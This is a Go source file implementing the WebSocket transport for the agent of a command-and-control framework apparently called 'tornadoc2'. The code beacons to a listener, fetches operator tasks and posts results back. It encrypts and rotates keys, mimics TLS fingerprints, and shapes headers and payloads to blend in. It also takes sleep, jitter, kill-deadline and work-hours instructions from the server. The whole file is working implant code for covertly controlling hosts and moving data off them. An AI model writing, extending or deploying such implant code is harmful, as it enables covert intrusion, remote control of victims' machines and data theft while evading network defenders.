package transport

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/coder/websocket"
	"github.com/coder/websocket/wsjson"

	"tornadoc2/agent/crypto"
	"tornadoc2/agent/features"
	"tornadoc2/agent/internal/tlsfp"
	"tornadoc2/agent/protocol"
)

type wsTransport struct {
	baseURL string
	profile protocol.Profile
	tlsCfg  *tls.Config
	cookie  string
	shaping *features.ShapingSpec
}

func NewWebSocketTransport(urlStr string, profile protocol.Profile,
	tlsCfg *tls.Config, shaping *features.ShapingSpec) (*wsTransport, error) {

	if tlsCfg == nil {
		tlsCfg = &tls.Config{}
	}
	return &wsTransport{
		baseURL: strings.TrimRight(urlStr, "/"),
		profile: profile,
		tlsCfg:  tlsCfg,
		shaping: shaping,
	}, nil
}

func (t *wsTransport) Name() string { return "websocket" }

func (t *wsTransport) call(ctx context.Context,
	verb string, body interface{}, epk string) (
	json.RawMessage, error) {

	wsURL := strings.Replace(t.baseURL, "https://", "wss://", 1)
	wsURL = strings.Replace(wsURL, "http://", "ws://", 1)
	path := t.profile.BeaconPath
	if verb == "tasks" {
		path = t.profile.TasksPath
	}
	if verb == "results" {
		path = t.profile.ResultsPath
	}

	ctx, cancel := context.WithTimeout(ctx, 30*time.Second)
	defer cancel()

	httpClient, terr := tlsfp.NewHTTPClient(
		protocol.WireTLSProfile, t.tlsCfg)
	if terr != nil {
		return nil, fmt.Errorf("ws: tls profile: %w", terr)
	}

	conn, _, err := websocket.Dial(ctx, wsURL+path,
		&websocket.DialOptions{
			HTTPClient: httpClient,
			HTTPHeader: t.buildHeaders(),
		})
	if err != nil {
		return nil, fmt.Errorf("ws: dial: %w", err)
	}
	defer conn.Close(websocket.StatusNormalClosure, "")

	env := map[string]interface{}{
		"verb": verb,
	}
	if body != nil {
		env["body"] = body
	}
	if t.cookie != "" {
		env["cookie"] = t.cookie
	}
	if epk != "" {
		env["epk"] = epk
	}

	writeCtx, writeCancel := context.WithTimeout(ctx, 10*time.Second)
	defer writeCancel()
	if err := wsjson.Write(writeCtx, conn, env); err != nil {
		return nil, fmt.Errorf("ws: write: %w", err)
	}

	readCtx, readCancel := context.WithTimeout(ctx, 25*time.Second)
	defer readCancel()
	var reply struct {
		Body   json.RawMessage `json:"body"`
		Cookie string          `json:"cookie"`
		Err    string          `json:"error"`
		// Scheduling carries the same values the HTTP and
		// QUIC transports deliver as response headers on
		// every /tasks reply. The field is present only when
		// the listener set at least one X-Beacon-* header, so
		// a beacon or results reply leaves the protocol
		// globals untouched.
		Scheduling struct {
			Sleep    string `json:"sleep,omitempty"`
			Jitter   string `json:"jitter,omitempty"`
			Kill     string `json:"kill_deadline,omitempty"`
			WorkStart string `json:"work_start,omitempty"`
			WorkEnd  string `json:"work_end,omitempty"`
		} `json:"scheduling,omitempty"`
	}
	if err := wsjson.Read(readCtx, conn, &reply); err != nil {
		return nil, fmt.Errorf("ws: read: %w", err)
	}
	if reply.Err != "" {
		return nil, errors.New("ws: " + reply.Err)
	}
	if reply.Cookie != "" {
		t.cookie = reply.Cookie
	}

	// Apply the scheduling fields to the protocol package
	// globals, exactly as the HTTP transport applies its
	// X-Beacon-* response headers. core/main.go's fetchTasks
	// reads these back after FetchTasks returns.
	if s := reply.Scheduling; s.Sleep != "" ||
		s.Jitter != "" || s.Kill != "" ||
		s.WorkStart != "" || s.WorkEnd != "" {
		if s.Sleep != "" {
			if n, err := strconv.Atoi(s.Sleep); err == nil && n >= 0 {
				protocol.ScheduleSleep = n
			}
		}
		if s.Jitter != "" {
			if f, err := strconv.ParseFloat(s.Jitter, 64); err == nil {
				protocol.ScheduleJitter = f
			}
		}
		if s.Kill != "" {
			if n, err := strconv.ParseInt(s.Kill, 10, 64); err == nil && n > 0 {
				protocol.ScheduleKill = n
			}
		}
		if s.WorkStart != "" {
			if n, err := strconv.Atoi(s.WorkStart); err == nil && n >= 0 && n < 1440 {
				protocol.WorkHoursStart = n
			}
		}
		if s.WorkEnd != "" {
			if n, err := strconv.Atoi(s.WorkEnd); err == nil && n >= 0 && n < 1440 {
				protocol.WorkHoursEnd = n
			}
		}
	}

	return reply.Body, nil
}

func (t *wsTransport) buildHeaders() http.Header {
	h := http.Header{}
	h.Set("Content-Type", "application/json")
	for k, v := range t.profile.RequestHeaders {
		h.Set(k, v)
	}
	for k, v := range t.profile.ExtraHeaders {
		h.Set(k, v)
	}
	if t.profile.UserAgent != "" {
		h.Set("User-Agent", t.profile.UserAgent)
	}
	return h
}

func (t *wsTransport) CheckIn(identity protocol.Identity,
	pubkeyPEM, identitySig string, identityTs int64,
	wire *crypto.WireSession) (*protocol.CheckinResponse, error) {

	payload := protocol.CheckinRequest{Identity: identity}
	if pubkeyPEM != "" {
		payload.AgentPubKey = pubkeyPEM
	}
	if identitySig != "" {
		payload.IdentitySig = identitySig
		payload.IdentityTs = identityTs
	}
	body, err := json.Marshal(payload)
	if err != nil {
		return nil, err
	}
	if wire != nil {
		body, err = wire.EncryptRequest(body)
		if err != nil {
			return nil, err
		}
	}
	raw, err := t.call(context.Background(),
		"beacon", json.RawMessage(body), "")
	if err != nil {
		return nil, err
	}
	if wire != nil {
		plain, wasEnc, derr := wire.DecryptResponse(raw)
		if derr != nil {
			return nil, fmt.Errorf("decrypt: %w", derr)
		}
		if wasEnc {
			raw = plain
		}
	}
	if t.shaping != nil && t.shaping.CheckinResponse != nil {
		u, err := features.ShapeUnwrap(raw,
			t.shaping.CheckinResponse)
		if err != nil {
			return nil, fmt.Errorf("checkin shape: %w", err)
		}
		raw = u
	}
	var out protocol.CheckinResponse
	if err := json.Unmarshal(raw, &out); err != nil {
		return nil, err
	}
	if out.Cookie == "" {
		return nil, errors.New("ws: checkin reply missing cookie")
	}
	t.cookie = out.Cookie
	return &out, nil
}

func (t *wsTransport) FetchTasks(wire *crypto.WireSession) ([]protocol.Task, error) {
	epk := ""
	if wire != nil {
		v, err := wire.RotateEphemeral()
		if err != nil {
			return nil, fmt.Errorf("ws: rotate epk: %w", err)
		}
		epk = v
	}
	raw, err := t.call(context.Background(),
		"tasks", nil, epk)
	if err != nil {
		return nil, err
	}
	if len(raw) == 0 || bytes.Equal(raw, []byte("null")) {
		return nil, nil
	}
	if wire != nil {
		plain, wasEnc, derr := wire.DecryptResponse(raw)
		if derr != nil {
			return nil, fmt.Errorf("decrypt: %w", derr)
		}
		if wasEnc {
			raw = plain
		}
	}
	if t.shaping != nil && t.shaping.TasksResponse != nil {
		u, err := features.ShapeUnwrap(raw,
			t.shaping.TasksResponse)
		if err != nil {
			return nil, fmt.Errorf("tasks shape: %w", err)
		}
		raw = u
	}
	var tasks []protocol.Task
	if err := json.Unmarshal(raw, &tasks); err != nil {
		return nil, err
	}
	return tasks, nil
}

func (t *wsTransport) PostResult(r protocol.Result,
	wire *crypto.WireSession) error {

	body, err := json.Marshal(r)
	if err != nil {
		return err
	}
	if t.shaping != nil && t.shaping.ResultsRequest != nil {
		body, err = features.ShapeWrap(
			t.shaping.ResultsRequest, r)
		if err != nil {
			return err
		}
	}
	if wire != nil {
		body, err = wire.EncryptRequest(body)
		if err != nil {
			return err
		}
	}
	_, err = t.call(context.Background(),
		"results", json.RawMessage(body), "")
	return err
}

func (t *wsTransport) Close() error { return nil }